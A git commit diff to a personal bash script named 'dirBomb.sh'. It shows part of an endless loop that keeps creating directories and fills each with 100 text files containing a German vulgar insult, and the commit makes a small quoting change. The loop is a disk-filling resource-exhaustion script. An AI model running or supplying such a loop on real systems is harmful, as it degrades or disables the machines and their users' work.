92032b46c3b630f1a4fcca6e1c9e753aa3d8ac42
nicolashoeller <hoellr3.0@gmail.com>
2023-11-19 22:27:21 +0100

    corrected bug to create text file

--- bash-personal/dirBomb.sh
+++ bash-personal/dirBomb.sh
@@ -7,7 +7,7 @@ while [ 1 = 1 ]; do
     mkdir $x
     cd $x
     while [ $y -le 100 ]; do
-        echo "HURENSOHN69" > "$y.txt"
+        echo "HURENSOHN69" > $y".txt"
         ((y++))
     done
     cd ..
